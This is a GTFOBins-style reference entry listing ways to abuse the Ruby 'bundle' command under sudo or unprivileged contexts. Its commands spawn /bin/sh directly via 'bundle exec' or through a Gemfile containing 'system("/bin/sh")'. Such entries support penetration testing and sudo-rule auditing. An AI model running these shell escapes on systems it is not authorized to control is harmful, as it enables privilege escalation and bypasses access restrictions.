---
type: gtfobin
name: bundle
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# bundle

## inherit

```bash
bundle help
```
**Contexts:** sudo, unprivileged

```bash
touch Gemfile
bundle console
```
**Contexts:** sudo, unprivileged

## shell

```bash
BUNDLE_GEMFILE=x bundle exec /bin/sh
```
**Contexts:** sudo, unprivileged

```bash
touch Gemfile
bundle exec /bin/sh
```
**Contexts:** sudo, unprivileged

```bash
echo 'system("/bin/sh")' >Gemfile
bundle install
```
_This might run the shell twice, one after the other._
**Contexts:** sudo, unprivileged
